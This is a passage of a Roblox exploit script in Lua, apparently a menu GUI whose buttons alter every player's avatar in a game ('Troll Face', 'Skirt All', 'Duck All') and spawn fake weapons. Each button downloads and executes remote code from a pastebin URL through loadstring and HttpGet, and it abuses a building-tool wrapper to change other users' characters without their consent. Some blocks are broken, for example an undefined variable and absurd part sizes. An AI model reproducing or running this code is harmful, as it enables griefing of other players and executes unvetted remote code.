       part.CanCollide = false

       part.Anchored = false

       part.BrickColor = BrickColor.new(226)



       

       part.CFrame = player.Character["Head"].CFrame * CFrame.new(0,0, 0)    wait()

          part:WeldTo(player.Character["Head"])

F3X.Object(player.Character["Head"]).Transparency = 1

local lol = part:AddMesh()

       lol.MeshId = "http://www.roblox.com/asset/?id=1009824073"

lol.TextureId = "http://www.roblox.com/asset/?id=1009824086"

lol.Scale = Vector3.new(0.3, 0.3, 0.3)

end)

end

end)

Section1:NewButton("Troll Face", "", function()

 local F3X = loadstring(game:HttpGet("https://pastebin.com/raw/TQgu7X5u"))()



for _,player in pairs(game:GetService("Players"):GetChildren()) do

   spawn(function()

       F3X.Edit(game:GetService("Players"):GetChildren(), {Transparency = 0})

        for _,limb in pairs(player.Character:GetChildren()) do

           if limb:IsA("Accessory") and limb:FindFirstChildWhichIsA("BasePart") then

               F3X.Object(limb:FindFirstChildWhichIsA("BasePart")):Destroy()

           end

       end

             local part = F3X.new("Part", workspace)

       part.Locked = true

       part.CanCollide = false

       part.Anchored = false

       part.BrickColor = BrickColor.new(226)



       

       part.CFrame = player.Character["Head"].CFrame * CFrame.new(0.2,0, -0.6)    wait()

          part:WeldTo(player.Character["Head"])

F3X.Object(player.Character["Head"]).Transparency = 1

local lol = part:AddMesh()

       lol.MeshId = "http://www.roblox.com/asset/?id=6900071612"

lol.TextureId = "http://www.roblox.com/asset/?id=6900071652"

lol.Scale = Vector3.new(1.7, 1.7, 1.7)

end)

end

end)

Section1:NewButton("Skirt All", "", function()

     local F3X = loadstring(game:HttpGet("https://pastebin.com/raw/TQgu7X5u"))()



for _,player in pairs(game:GetService("Players"):GetChildren()) do

   spawn(function()

       F3X.Edit(game:GetService("Players"):GetChildren(), {Transparency = 0})

        for _,limb in pairs(player.Character:GetChildren()) do

           if limb:IsA("Accessory") and limb:FindFirstChildWhichIsA("BasePart") then

               F3X.Object(limb:FindFirstChildWhichIsA("BasePart")):Destroy()

           end

       end

             local part = F3X.new("Part", workspace)

       part.Locked = true

       part.CanCollide = false

       part.Anchored = false

       part.BrickColor = BrickColor.new(226)



       

       part.CFrame = player.Character["Torso"].CFrame * CFrame.new(0,0, 0)    wait()

          part:WeldTo(player.Character["Torso"])



local lol = part:AddMesh()

       lol.MeshId = "http://www.roblox.com/asset/?id=6970465326"

lol.TextureId = "http://www.roblox.com/asset/?id=6970465363"

lol.Scale = Vector3.new(1, 1, 1)

end)

end

end)

Section1:NewButton("SpiderMan All", "", function()

      local F3X = loadstring(game:HttpGet("https://pastebin.com/raw/TQgu7X5u"))()



for _,player in pairs(game:GetService("Players"):GetChildren()) do

   spawn(function()

       F3X.Edit(game:GetService("Players"):GetChildren(), {Transparency = 0})

for _,limb in pairs(player.Character:GetChildren()) do

           if limb:IsA("Accessory") and limb:FindFirstChildWhichIsA("BasePart") then

               F3X.Object(limb:FindFirstChildWhichIsA("BasePart")):Destroy()

           end

end

       

      

       local pchar = player.Character               

pchar.Head.Transparency = 1

pchar["Left Arm"].Transparency = 1

pchar["Right Arm"].Transparency = 1

pchar["Left Leg"].Transparency = 1

pchar["Right Leg"].Transparency = 1 



       local part = F3X.new("Part", workspace)

       part.Locked = true

       part.CanCollide = false

       part.Anchored = false

       part.BrickColor = BrickColor.new(226)



       part.Size = Vector3.new(1, 1, 1)

       part.CFrame = player.Character["Torso"].CFrame * CFrame.new(0,0, 0)    wait()

          part:WeldTo(player.Character["Torso"])

       local duck = part:AddMesh()

       duck.MeshId = "http://www.roblox.com/asset/?id=6834091733"

duck.TextureId = "http://www.roblox.com/asset/?id=6834092689"



		duck.Scale = Vector3.new(1, 1, 1)

F3X.Object(player.Character["Torso"]).Transparency = 1



  

end)

end

end)



Section1:NewButton("Funky All", "", function()

    local F3X = loadstring(game:HttpGet("https://pastebin.com/raw/TQgu7X5u"))()



for _,player in pairs(game:GetService("Players"):GetChildren()) do

   spawn(function()

       F3X.Edit(game:GetService("Players"):GetChildren(), {Transparency = 0})



       local pchar = player.Character               

pchar.Head.Transparency = 1

pchar["Left Arm"].Transparency = 1

pchar["Right Arm"].Transparency = 1

pchar["Left Leg"].Transparency = 1

pchar["Right Leg"].Transparency = 1 

       		for i = 1,1 do

       local part = F3X.new("Part", workspace)

       part.Locked = true

       part.CanCollide = false

       part.Anchored = false

       part.BrickColor = BrickColor.new(226)



       part.Size = Vector3.new(1, 1, 1)

       part.CFrame = player.Character["Torso"].CFrame * CFrame.new(0,0, 0)    wait()

          part:WeldTo(player.Character["Torso"])

       local duck = part:AddMesh()

       duck.MeshId = "http://www.roblox.com/asset/?id=6533498609"

duck.TextureId = "http://www.roblox.com/asset/?id=6533498648"



		duck.Scale = Vector3.new(.01, .01, .01)

F3X.Object(player.Character["Torso"]).Transparency = 1

for i,v in next, game:GetService('Players').LocalPlayer.Character:GetChildren() do

   if v:IsA('Accessory') then

       v:Destroy()

   end

end

end

      end)

end

end)

Section1:NewButton("Duck All", "", function()

    local F3X = loadstring(game:HttpGet("https://pastebin.com/raw/TQgu7X5u"))()



for _,player in pairs(game:GetService("Players"):GetChildren()) do

   spawn(function()

       F3X.Edit(game:GetService("Players"):GetChildren(), {Transparency = 0})



       local pchar = player.Character               

pchar.Head.Transparency = 1

pchar["Left Arm"].Transparency = 1

pchar["Right Arm"].Transparency = 1

pchar["Left Leg"].Transparency = 1

pchar["Right Leg"].Transparency = 1 

       		for i = 1,1 do

       local part = F3X.new("Part", workspace)

       part.Locked = true

       part.CanCollide = false

       part.Anchored = false

       part.BrickColor = BrickColor.new(226)



       part.Size = Vector3.new(1, 1, 1)

       part.CFrame = player.Character["Torso"].CFrame * CFrame.new(0,0, 0)    wait()

          part:WeldTo(player.Character["Torso"])

       local duck = part:AddMesh()

       duck.MeshId = "http://www.roblox.com/asset/?id=9419831"

duck.TextureId = "http://www.roblox.com/asset/?id=9419827"



		duck.Scale = Vector3.new(5, 5, 5)

F3X.Object(player.Character["Torso"]).Transparency = 1

for i,v in next, game:GetService('Players').LocalPlayer.Character:GetChildren() do

   if v:IsA('Accessory') then

       v:Destroy()

   end

end

end

      end)

end

end)

Section1:NewButton("AmongUS All", "", function()

    local F3X = loadstring(game:HttpGet("https://pastebin.com/raw/TQgu7X5u"))()



for _,player in pairs(game.Players:GetPlayers()) do

   spawn(function()

       F3X.Edit(player.Character:GetChildren(), {Transparency = 1})

       for _,limb in pairs(player.Character:GetChildren()) do

           if limb:IsA("Accessory") and limb:FindFirstChildWhichIsA("BasePart") then

               F3X.Object(limb:FindFirstChildWhichIsA("BasePart")):Destroy()

           end

       end

       local part = F3X.new("Part", workspace)

       part.CanCollide = false

       part.Size = Vector3.new(3, 4, 3)

       part.CFrame = player.Character.HumanoidRootPart.CFrame * CFrame.new(0, -0.5, 0)

       wait()

       part:WeldTo(player.Character.HumanoidRootPart)

       local mesh = part:AddMesh()

       mesh.MeshId = "rbxassetid://6235963214"

       mesh.TextureId = "rbxassetid://6235963270"

       mesh.Scale = Vector3.new(.1, .1, .1)

   end)

end

end)

Section1:NewButton("Noob All", "", function()

    local F3X = loadstring(game:HttpGet("https://pastebin.com/raw/TQgu7X5u"))()



for _,player in pairs(game:GetService("Players"):GetChildren()) do

   spawn(function()

       F3X.Edit(game:GetService("Players"):GetChildren(), {Transparency = 0})



       local pchar = player.Character               

pchar.Head.Transparency = 1

pchar["Left Arm"].Transparency = 1

pchar["Right Arm"].Transparency = 1

pchar["Left Leg"].Transparency = 1

pchar["Right Leg"].Transparency = 1 

       		for i = 1,1 do

       local part = F3X.new("Part", workspace)

       part.Locked = true

       part.CanCollide = false

       part.Anchored = false

       part.BrickColor = BrickColor.new(226)



       part.Size = Vector3.new(1, 1, 1)

       part.CFrame = player.Character["Torso"].CFrame * CFrame.new(0,0, 0)    wait()

          part:WeldTo(player.Character["Torso"])

       local duck = part:AddMesh()

       duck.MeshId = "http://www.roblox.com/asset/?id=2711200539"

duck.TextureId = "http://www.roblox.com/asset/?id=2711200587"



		duck.Scale = Vector3.new(1, 1, 1)

F3X.Object(player.Character["Torso"]).Transparency = 1

for i,v in next, game:GetService('Players').LocalPlayer.Character:GetChildren() do

   if v:IsA('Accessory') then

       v:Destroy()

   end

end

end

      end)

end

end)

Section1:NewButton("Anime All", "", function()

    local F3X = loadstring(game:HttpGet("https://pastebin.com/raw/TQgu7X5u"))()



for _,player in pairs(game:GetService("Players"):GetChildren()) do

   spawn(function()

       F3X.Edit(game:GetService("Players"):GetChildren(), {Transparency = 0})



       local pchar = player.Character               

pchar.Head.Transparency = 1

pchar["Left Arm"].Transparency = 1

pchar["Right Arm"].Transparency = 1

pchar["Left Leg"].Transparency = 1

pchar["Right Leg"].Transparency = 1 

       		for i = 1,1 do

       local part = F3X.new("Part", workspace)

       part.Locked = true

       part.CanCollide = false

       part.Anchored = false

       part.BrickColor = BrickColor.new(226)



       part.Size = Vector3.new(1, 1, 1)

       part.CFrame = player.Character["Torso"].CFrame * CFrame.new(0,0, 0)    wait()

          part:WeldTo(player.Character["Torso"])

       local duck = part:AddMesh()

       duck.MeshId = "http://www.roblox.com/asset/?id=7262213072"

duck.TextureId = "http://www.roblox.com/asset/?id=7262215836"





		duck.Scale = Vector3.new(.5, .5, .5)

F3X.Object(player.Character["Torso"]).Transparency = 1

for i,v in next, game:GetService('Players').LocalPlayer.Character:GetChildren() do

   if v:IsA('Accessory') then

       v:Destroy()

   end

end

end

      end)

end

end)

Section1:NewButton("EggDog All", "", function()

    local F3X = loadstring(game:HttpGet("https://pastebin.com/raw/TQgu7X5u"))()



for _,player in pairs(game:GetService("Players"):GetChildren()) do

   spawn(function()

       F3X.Edit(game:GetService("Players"):GetChildren(), {Transparency = 0})



       local pchar = player.Character               

pchar.Head.Transparency = 1

pchar["Left Arm"].Transparency = 1

pchar["Right Arm"].Transparency = 1

pchar["Left Leg"].Transparency = 1

pchar["Right Leg"].Transparency = 1 

       		for i = 1,1 do

       local part = F3X.new("Part", workspace)

       part.Locked = true

       part.CanCollide = false

       part.Anchored = false

       part.BrickColor = BrickColor.new(226)



       part.Size = Vector3.new(1, 1, 1)

       part.CFrame = player.Character["Torso"].CFrame * CFrame.new(0,0, 0)    wait()

          part:WeldTo(player.Character["Torso"])

       local duck = part:AddMesh()

       duck.MeshId = "http://www.roblox.com/asset/?id=3142513417"

duck.TextureId = "http://www.roblox.com/asset/?id=3142513433"





		duck.Scale = Vector3.new(.1, .1, .1)

F3X.Object(player.Character["Torso"]).Transparency = 1

for i,v in next, game:GetService('Players').LocalPlayer.Character:GetChildren() do

   if v:IsA('Accessory') then

       v:Destroy()

   end

end

end

      end)

end

end)

Section1:NewButton("BlockMan All", "", function()

      local F3X = loadstring(game:HttpGet("https://pastebin.com/raw/TQgu7X5u"))()



for _,player in pairs(game:GetService("Players"):GetChildren()) do

   spawn(function()

       F3X.Edit(game:GetService("Players"):GetChildren(), {Transparency = 0})

           if limb:IsA("Accessory") and limb:FindFirstChildWhichIsA("BasePart") then

               F3X.Object(limb:FindFirstChildWhichIsA("BasePart")):Destroy()

           end

           end)

  local part = F3X.new("Part", workspace)

       part.Locked = true

       part.CanCollide = false

       part.Anchored = false

       part.BrickColor = BrickColor.new(1)



       part.Size = Vector3.new(3, 1.5, 1.5)

       part.CFrame = player.Character["Head"].CFrame * CFrame.new(0,0, 0)    wait()

          part:WeldTo(player.Character["Head"])

            local part = F3X.new("Part", workspace)

       part.Locked = true

       part.CanCollide = false

       part.Anchored = false

       part.BrickColor = BrickColor.new(1)



       part.Size = Vector3.new(1.2, 3, 1.5)

       part.CFrame = player.Character["Left Arm"].CFrame * CFrame.new(0,0, 0)    wait()

          part:WeldTo(player.Character["Left Arm"])

                local part = F3X.new("Part", workspace)

       part.Locked = true

       part.CanCollide = false

       part.Anchored = false

       part.BrickColor = BrickColor.new(1)



       part.Size = Vector3.new(1.2, 3, 1.5)

       part.CFrame = player.Character["Right Arm"].CFrame * CFrame.new(0,0, 0)    wait()

          part:WeldTo(player.Character["Right Arm"])

              local part = F3X.new("Part", workspace)

       part.Locked = true

       part.CanCollide = false

       part.Anchored = false

       part.BrickColor = BrickColor.new(1)



       part.Size = Vector3.new(1.2, 3, 1.5)

       part.CFrame = player.Character["Right Leg"].CFrame * CFrame.new(0,0, 0)    wait()

          part:WeldTo(player.Character["Right Leg"])

                local part = F3X.new("Part", workspace)

       part.Locked = true

       part.CanCollide = false

       part.Anchored = false

       part.BrickColor = BrickColor.new(1)



       part.Size = Vector3.new(1.2, 3, 1.5)

       part.CFrame = player.Character["Left Leg"].CFrame * CFrame.new(0,0, 0)    wait()

          part:WeldTo(player.Character["Left Leg"])

                      local part = F3X.new("Part", workspace)

       part.Locked = true

       part.CanCollide = false

       part.Anchored = false

       part.BrickColor = BrickColor.new(1)



       part.Size = Vector3.new(2, 3, 1.5)

       part.CFrame = player.Character["Torso"].CFrame * CFrame.new(0,0, 0)    wait()

          part:WeldTo(player.Character["Torso"])



end

end)

Section1:NewButton("Knuckles All", "", function()

      local F3X = loadstring(game:HttpGet("https://pastebin.com/raw/TQgu7X5u"))()



for _,player in pairs(game:GetService("Players"):GetChildren()) do

   spawn(function()

       F3X.Edit(game:GetService("Players"):GetChildren(), {Transparency = 0})

for _,limb in pairs(player.Character:GetChildren()) do

           if limb:IsA("Accessory") and limb:FindFirstChildWhichIsA("BasePart") then

               F3X.Object(limb:FindFirstChildWhichIsA("BasePart")):Destroy()

           end

end

       

      

       local pchar = player.Character               

pchar.Head.Transparency = 1

pchar["Left Arm"].Transparency = 1

pchar["Right Arm"].Transparency = 1

pchar["Left Leg"].Transparency = 1

pchar["Right Leg"].Transparency = 1 



       local part = F3X.new("Part", workspace)

       part.Locked = true

       part.CanCollide = false

       part.Anchored = false

       part.BrickColor = BrickColor.new(226)



       part.Size = Vector3.new(1, 1, 1)

       part.CFrame = player.Character["Torso"].CFrame * CFrame.new(0,0, 0)    wait()

          part:WeldTo(player.Character["Torso"])

       local duck = part:AddMesh()

       duck.MeshId = "http://www.roblox.com/asset/?id=5330551132"

duck.TextureId = "http://www.roblox.com/asset/?id=5330551192"



		duck.Scale = Vector3.new(5, 5, 5)

F3X.Object(player.Character["Torso"]).Transparency = 1



  

end)

end

end)

Section1:NewButton("BigHead All", "", function()

 local F3X = loadstring(game:HttpGet("https://pastebin.com/raw/TQgu7X5u"))()



for _,player in pairs(game:GetService("Players"):GetChildren()) do

   spawn(function()

       F3X.Edit(game:GetService("Players"):GetChildren(), {Transparency = 0})

        for _,limb in pairs(player.Character:GetChildren()) do

           if limb:IsA("Accessory") and limb:FindFirstChildWhichIsA("BasePart") then

               F3X.Object(limb:FindFirstChildWhichIsA("BasePart")):Destroy()

           end

        end

            local part = F3X.new("Part", workspace)

       part.CanCollide = false

part.BrickColor = BrickColor.new(23)

part.Material = ("Smooth Plastic")

       part.Size = Vector3.new(1,1,1)

       part.CFrame = player.Character.Head.CFrame * CFrame.new(0, 0, 0)

          wait()

      part:WeldTo(player.Character.Head)





   local Arm2 = part:AddMesh()

Arm2.Type = ""

Arm2.Scale = Vector3.new(2.5,2.5,2.5)

end)

end

end)

Section1:NewButton("Rainbow All", "", function()

    local F3X = loadstring(game:HttpGet("https://pastebin.com/raw/TQgu7X5u"))()

	

		for _,player in pairs(game.Players:GetPlayers()) do

			spawn(function()

				F3X.Edit(player.Character:GetChildren(), {})

				while wait(0.7) do

					F3X.Object(player.Character["Head"]).BrickColor = BrickColor.new(154)

					F3X.Object(player.Character["Torso"]).BrickColor = BrickColor.new(154)

					F3X.Object(player.Character["Left Leg"]).BrickColor = BrickColor.new(154)

					F3X.Object(player.Character["Right Leg"]).BrickColor = BrickColor.new(154)

					F3X.Object(player.Character["Left Arm"]).BrickColor = BrickColor.new(154)

					F3X.Object(player.Character["Right Arm"]).BrickColor = BrickColor.new(154)

				end

			end)

		end

	

	

    end)

local Tab = Window:NewTab("Tools")

local Section2 = Tab:NewSection("Tools")

Section2:NewButton("Gravity Hammer", "", function()

    

player = game.Players.LocalPlayer



Tool0 = Instance.new("Tool")

Part1 = Instance.new("Part")



Tool0.Parent = player.Backpack

Tool0.Grip = CFrame.new(0, -1.00000083, 0, 1, 5.77420778e-08, -3.2037471e-07, -5.77420316e-08, 1, 1.37835528e-07, 3.2037471e-07, -1.37835514e-07, 1)

Tool0.GripForward = Vector3.new(3.2037470987233974e-07, -1.378355278802701e-07, -1)

Tool0.GripPos = Vector3.new(0, -1.0000008344650269, 0)

Tool0.GripRight = Vector3.new(1, -5.774203160058278e-08, 3.2037470987233974e-07)

Tool0.GripUp = Vector3.new(5.77420777858606e-08, 1, -1.3783551366941538e-07)

Part1.Name = "Handle"

Part1.Parent = Tool0

Part1.CFrame = CFrame.new(2.75, 1.87499976, -16.25, 1, 0, 0, 0, 1, 0, 0, 0, 1)

Part1.Position = Vector3.new(2.75, 1.874999761581421, -16.25)

Part1.Size = Vector3.new(0,0,0)

Part1.BottomSurface = Enum.SurfaceType.Smooth

Part1.TopSurface = Enum.SurfaceType.Smooth













  local F3X = loadstring(game:HttpGet("https://pastebin.com/raw/TQgu7X5u"))()





       



       local part = F3X.new("Part", workspace)



part.Locked = true

       part.Size = Vector3.new(-48583883487437474, -48583883487437474, -4858388348743745545454535535345353453574)

       part.CFrame = game.Players.LocalPlayer.Character["Right Arm"].CFrame * CFrame.Angles(5,0,0)*  CFrame.new(0,0.5, -1.45)  wait()

          part:WeldTo(game.Players.LocalPlayer.Character["Right Arm"])

       local duck = part:AddMesh()

       duck.MeshId = "http://www.roblox.com/asset/?id=33685862"

duck.TextureId = "http://www.roblox.com/asset/?id=33685897"



		duck.Scale = Vector3.new(1, 1, 1)

		

game.Players.LocalPlayer.Backpack.Tool.Parent = game.Players.LocalPlayer.Character



end)

Section2:NewButton("ShotGun", "", function()

        

player = game.Players.LocalPlayer



Tool0 = Instance.new("Tool")

Part1 = Instance.new("Part")



Tool0.Parent = player.Backpack

Tool0.Grip = CFrame.new(0, -1.00000083, 0, 1, 5.77420778e-08, -3.2037471e-07, -5.77420316e-08, 1, 1.37835528e-07, 3.2037471e-07, -1.37835514e-07, 1)

Tool0.GripForward = Vector3.new(3.2037470987233974e-07, -1.378355278802701e-07, -1)

Tool0.GripPos = Vector3.new(0, -1.0000008344650269, 0)

Tool0.GripRight = Vector3.new(1, -5.774203160058278e-08, 3.2037470987233974e-07)

Tool0.GripUp = Vector3.new(5.77420777858606e-08, 1, -1.3783551366941538e-07)

Part1.Name = "Handle"

Part1.Parent = Tool0

Part1.CFrame = CFrame.new(2.75, 1.87499976, -16.25, 1, 0, 0, 0, 1, 0, 0, 0, 1)

Part1.Position = Vector3.new(2.75, 1.874999761581421, -16.25)

Part1.Size = Vector3.new(0,0,0)

Part1.BottomSurface = Enum.SurfaceType.Smooth

Part1.TopSurface = Enum.SurfaceType.Smooth













  local F3X = loadstring(game:HttpGet("https://pastebin.com/raw/TQgu7X5u"))()





       



       local part = F3X.new("Part", workspace)



part.Locked = true

       part.Size = Vector3.new(-48583883487437474, -48583883487437474, -4858388348743745545454535535345353453574)

       part.CFrame = game.Players.LocalPlayer.Character["Right Arm"].CFrame * CFrame.Angles(4.74,0,0)*  CFrame.new(0,0, -1.85)  wait()

          part:WeldTo(game.Players.LocalPlayer.Character["Right Arm"])

       local duck = part:AddMesh()

       duck.MeshId = "http://www.roblox.com/asset/?id=94219391"

duck.TextureId = "http://www.roblox.com/asset/?id=94219470"



		duck.Scale = Vector3.new(1, 1, 1)

		

game.Players.LocalPlayer.Backpack.Tool.Parent = game.Players.LocalPlayer.Character



end)

Section2:NewButton("Pro Sign", "", function()

        

player = game.Players.LocalPlayer



Tool0 = Instance.new("Tool")

Part1 = Instance.new("Part")



Tool0.Parent = player.Backpack

Tool0.Grip = CFrame.new(0, -1.00000083, 0, 1, 5.77420778e-08, -3.2037471e-07, -5.77420316e-08, 1, 1.37835528e-07, 3.2037471e-07, -1.37835514e-07, 1)

Tool0.GripForward = Vector3.new(3.2037470987233974e-07, -1.378355278802701e-07, -1)

Tool0.GripPos = Vector3.new(0, -1.0000008344650269, 0)

Tool0.GripRight = Vector3.new(1, -5.774203160058278e-08, 3.2037470987233974e-07)

Tool0.GripUp = Vector3.new(5.77420777858606e-08, 1, -1.3783551366941538e-07)

Part1.Name = "Handle"

Part1.Parent = Tool0

Part1.CFrame = CFrame.new(2.75, 1.87499976, -16.25, 1, 0, 0, 0, 1, 0, 0, 0, 1)

Part1.Position = Vector3.new(2.75, 1.874999761581421, -16.25)

Part1.Size = Vector3.new(0,0,0)

Part1.BottomSurface = Enum.SurfaceType.Smooth

Part1.TopSurface = Enum.SurfaceType.Smooth













  local F3X = loadstring(game:HttpGet("https://pastebin.com/raw/TQgu7X5u"))()





       



       local part = F3X.new("Part", workspace)



part.Locked = true

       part.Size = Vector3.new(-48583883487437474, -48583883487437474, -4858388348743745545454535535345353453574)

       part.CFrame = game.Players.LocalPlayer.Character["Right Arm"].CFrame * CFrame.Angles(6.27,0,0)*  CFrame.new(0,-1, -1.85)  wait()

          part:WeldTo(game.Players.LocalPlayer.Character["Right Arm"])

       local duck = part:AddMesh()

       duck.MeshId = "http://www.roblox.com/asset/?id=15631335"

duck.TextureId = "http://www.roblox.com/asset/?id=21433483"



		duck.Scale = Vector3.new(1, 1, 1)

		

game.Players.LocalPlayer.Backpack.Tool.Parent = game.Players.LocalPlayer.Character



end)

Section2:NewButton("Tommy's Gun", "", function()

        

player = game.Players.LocalPlayer



Tool0 = Instance.new("Tool")

Part1 = Instance.new("Part")



Tool0.Parent = player.Backpack

Tool0.Grip = CFrame.new(0, -1.00000083, 0, 1, 5.77420778e-08, -3.2037471e-07, -5.77420316e-08, 1, 1.37835528e-07, 3.2037471e-07, -1.37835514e-07, 1)

Tool0.GripForward = Vector3.new(3.2037470987233974e-07, -1.378355278802701e-07, -1)

Tool0.GripPos = Vector3.new(0, -1.0000008344650269, 0)

Tool0.GripRight = Vector3.new(1, -5.774203160058278e-08, 3.2037470987233974e-07)

Tool0.GripUp = Vector3.new(5.77420777858606e-08, 1, -1.3783551366941538e-07)

Part1.Name = "Handle"

Part1.Parent = Tool0

Part1.CFrame = CFrame.new(2.75, 1.87499976, -16.25, 1, 0, 0, 0, 1, 0, 0, 0, 1)

Part1.Position = Vector3.new(2.75, 1.874999761581421, -16.25)

Part1.Size = Vector3.new(0,0,0)

Part1.BottomSurface = Enum.SurfaceType.Smooth

Part1.TopSurface = Enum.SurfaceType.Smooth













  local F3X = loadstring(game:HttpGet("https://pastebin.com/raw/TQgu7X5u"))()





       



       local part = F3X.new("Part", workspace)



part.Locked = true

       part.Size = Vector3.new(-48583883487437474, -48583883487437474, -4858388348743745545454535535345353453574)

       part.CFrame = game.Players.LocalPlayer.Character["Right Arm"].CFrame * CFrame.Angles(4.72,0,0)*  CFrame.new(0,0.5, -0.5)  wait()

          part:WeldTo(game.Players.LocalPlayer.Character["Right Arm"])

       local duck = part:AddMesh()

       duck.MeshId = "http://www.roblox.com/asset/?id=116679805"

duck.TextureId = "http://www.roblox.com/asset/?id=116679995"



		duck.Scale = Vector3.new(1, 1, 1)

		

game.Players.LocalPlayer.Backpack.Tool.Parent = game.Players.LocalPlayer.Character



end)

Section2:NewButton("Skeleton King's Sword", "", function()

        

player = game.Players.LocalPlayer



Tool0 = Instance.new("Tool")

Part1 = Instance.new("Part")



Tool0.Parent = player.Backpack

Tool0.Grip = CFrame.new(0, -1.00000083, 0, 1, 5.77420778e-08, -3.2037471e-07, -5.77420316e-08, 1, 1.37835528e-07, 3.2037471e-07, -1.37835514e-07, 1)

Tool0.GripForward = Vector3.new(3.2037470987233974e-07, -1.378355278802701e-07, -1)

Tool0.GripPos = Vector3.new(0, -1.0000008344650269, 0)

Tool0.GripRight = Vector3.new(1, -5.774203160058278e-08, 3.2037470987233974e-07)

Tool0.GripUp = Vector3.new(5.77420777858606e-08, 1, -1.3783551366941538e-07)

Part1.Name = "Handle"

Part1.Parent = Tool0

Part1.CFrame = CFrame.new(2.75, 1.87499976, -16.25, 1, 0, 0, 0, 1, 0, 0, 0, 1)

Part1.Position = Vector3.new(2.75, 1.874999761581421, -16.25)

Part1.Size = Vector3.new(0,0,0)

Part1.BottomSurface = Enum.SurfaceType.Smooth

Part1.TopSurface = Enum.SurfaceType.Smooth













  local F3X = loadstring(game:HttpGet("https://pastebin.com/raw/TQgu7X5u"))()





       



       local part = F3X.new("Part", workspace)



part.Locked = true

       part.Size = Vector3.new(-48583883487437474, -48583883487437474, -4858388348743745545454535535345353453574)

       part.CFrame = game.Players.LocalPlayer.Character["Right Arm"].CFrame * CFrame.Angles(4.72,0,0)*  CFrame.new(0,2.5, -0.5)  wait()

          part:WeldTo(game.Players.LocalPlayer.Character["Right Arm"])

       local duck = part:AddMesh()

       duck.MeshId = "http://www.roblox.com/asset/?id=96026548"

duck.TextureId = "http://www.roblox.com/asset/?id=96026577"



		duck.Scale = Vector3.new(1, 1, 1)

		

game.Players.LocalPlayer.Backpack.Tool.Parent = game.Players.LocalPlayer.Character



end)

Section2:NewButton("Fencing Foil", "", function()

        

player = game.Players.LocalPlayer



Tool0 = Instance.new("Tool")

Part1 = Instance.new("Part")



Tool0.Parent = player.Backpack

Tool0.Grip = CFrame.new(0, -1.00000083, 0, 1, 5.77420778e-08, -3.2037471e-07, -5.77420316e-08, 1, 1.37835528e-07, 3.2037471e-07, -1.37835514e-07, 1)

Tool0.GripForward = Vector3.new(3.2037470987233974e-07, -1.378355278802701e-07, -1)

Tool0.GripPos = Vector3.new(0, -1.0000008344650269, 0)

Tool0.GripRight = Vector3.new(1, -5.774203160058278e-08, 3.2037470987233974e-07)

Tool0.GripUp = Vector3.new(5.77420777858606e-08, 1, -1.3783551366941538e-07)

Part1.Name = "Handle"

Part1.Parent = Tool0

Part1.CFrame = CFrame.new(2.75, 1.87499976, -16.25, 1, 0, 0, 0, 1, 0, 0, 0, 1)

Part1.Position = Vector3.new(2.75, 1.874999761581421, -16.25)

Part1.Size = Vector3.new(0,0,0)

Part1.BottomSurface = Enum.SurfaceType.Smooth

Part1.TopSurface = Enum.SurfaceType.Smooth













  local F3X = loadstring(game:HttpGet("https://pastebin.com/raw/TQgu7X5u"))()





       



       local part = F3X.new("Part", workspace)



part.Locked = true

       part.Size = Vector3.new(-48583883487437474, -48583883487437474, -4858388348743745545454535535345353453574)

       part.CFrame = game.Players.LocalPlayer.Character["Right Arm"].CFrame * CFrame.Angles(3.2, 0, 0)*  CFrame.new(0,1, 1.8)  wait()

          part:WeldTo(game.Players.LocalPlayer.Character["Right Arm"])

       local duck = part:AddMesh()

       duck.MeshId = "http://www.roblox.com/asset/?id=10908449"

duck.TextureId = "http://www.roblox.com/asset/?id=10908412"



		duck.Scale = Vector3.new(1.4, 1.4, 1.4)

		

game.Players.LocalPlayer.Backpack.Tool.Parent = game.Players.LocalPlayer.Character



end)

Section2:NewButton("Torch", "", function()

    player = game.Players.LocalPlayer



Tool0 = Instance.new("Tool")

Part1 = Instance.new("Part")



Tool0.Parent = player.Backpack

Tool0.Grip = CFrame.new(0, -1.00000083, 0, 1, 5.77420778e-08, -3.2037471e-07, -5.77420316e-08, 1, 1.37835528e-07, 3.2037471e-07, -1.37835514e-07, 1)

Tool0.GripForward = Vector3.new(3.2037470987233974e-07, -1.378355278802701e-07, -1)

Tool0.GripPos = Vector3.new(0, -1.0000008344650269, 0)

Tool0.GripRight = Vector3.new(1, -5.774203160058278e-08, 3.2037470987233974e-07)

Tool0.GripUp = Vector3.new(5.77420777858606e-08, 1, -1.3783551366941538e-07)

Part1.Name = "Handle"

Part1.Parent = Tool0

Part1.CFrame = CFrame.new(2.75, 1.87499976, -16.25, 1, 0, 0, 0, 1, 0, 0, 0, 1)

Part1.Position = Vector3.new(2.75, 1.874999761581421, -16.25)

Part1.Size = Vector3.new(0,0,0)

Part1.BottomSurface = Enum.SurfaceType.Smooth

Part1.TopSurface = Enum.SurfaceType.Smooth













  local F3X = loadstring(game:HttpGet("https://pastebin.com/raw/TQgu7X5u"))()





       



       local part = F3X.new("Part", workspace)



part.Locked = true

       part.Size = Vector3.new(-48583883487437474, -48583883487437474, -4858388348743745545454535535345353453574)

       part.CFrame = game.Players.LocalPlayer.Character["Right Arm"].CFrame * CFrame.Angles(4.72,0,0)*  CFrame.new(0,1.5, -0.5)  wait()

          part:WeldTo(game.Players.LocalPlayer.Character["Right Arm"])

       local duck = part:AddMesh()

       duck.MeshId = "http://www.roblox.com/asset/?id=31584522"

duck.TextureId = "http://www.roblox.com/asset/?id=31585584"

part:AddFire().Size = 2



		duck.Scale = Vector3.new(2, 2, 2)

		

game.Players.LocalPlayer.Backpack.Tool.Parent = game.Players.LocalPlayer.Character



end)

Section2:NewButton("Illumina", "", function()

    player = game.Players.LocalPlayer



Tool0 = Instance.new("Tool")

Part1 = Instance.new("Part")



Tool0.Parent = player.Backpack

Tool0.Grip = CFrame.new(0, -1.00000083, 0, 1, 5.77420778e-08, -3.2037471e-07, -5.77420316e-08, 1, 1.37835528e-07, 3.2037471e-07, -1.37835514e-07, 1)

Tool0.GripForward = Vector3.new(3.2037470987233974e-07, -1.378355278802701e-07, -1)

Tool0.GripPos = Vector3.new(0, -1.0000008344650269, 0)

Tool0.GripRight = Vector3.new(1, -5.774203160058278e-08, 3.2037470987233974e-07)

Tool0.GripUp = Vector3.new(5.77420777858606e-08, 1, -1.3783551366941538e-07)

Part1.Name = "Handle"

Part1.Parent = Tool0

Part1.CFrame = CFrame.new(2.75, 1.87499976, -16.25, 1, 0, 0, 0, 1, 0, 0, 0, 1)

Part1.Position = Vector3.new(2.75, 1.874999761581421, -16.25)

Part1.Size = Vector3.new(0,0,0)

Part1.BottomSurface = Enum.SurfaceType.Smooth

